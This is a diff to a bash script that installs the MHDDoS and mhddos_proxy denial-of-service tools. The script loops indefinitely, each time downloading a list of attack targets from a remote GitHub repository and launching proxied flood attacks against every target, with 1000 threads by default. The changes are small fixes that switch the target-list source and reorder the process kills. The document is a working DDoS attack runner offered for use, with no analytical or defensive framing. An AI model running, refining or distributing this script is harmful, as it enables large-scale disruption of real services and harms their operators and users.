@@ -1,8 +1,7 @@
 #!/bin/bash
-
 # Install git, python3 etc.
 sudo apt update -y
-sudo apt install git python3 python3-pip-y
+sudo apt install git python3 python3-pip -y
 sudo pip install --upgrade pip
 
 #Install latest version of mhddos_proxy and MHDDoS
@@ -14,9 +13,6 @@ sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxie
 sudo git clone https://github.com/MHProDev/MHDDoS.git
 sudo python3 -m pip install -r MHDDoS/requirements.txt
 cd ~
-
-#Just in case kill previous copies of mhddos and mhddos_proxy
-pkill -f start.py; pkill -f runner.py
 
 threads="${1:-1000}"
 threads="-t $threads"
@@ -31,22 +27,18 @@ proxy_interval="-p $proxy_interval"
 
 $debug="--debug"
 
-
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
 do
-   # Get number of targets in runner_targets.
-   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^[^#]" | wc -l)
+   pkill -f start.py; pkill -f runner.py 
+   # Get number of targets.
+   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
    echo -e "\nNumber of targets in list: " $list_size "\n"
-   
    for (( i=1; i<=list_size; i++ ))
       do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
-            echo -e "\n$cmd_line $proxy_interval $threads $rpc\n"
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
+            echo -e $i": " "$cmd_line $proxy_interval $threads $rpc\n"
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
       done
-
 sleep $restart_interval
-echo -e "RESTARTING\n"
-pkill -f start.py; pkill -f runner.py
 done
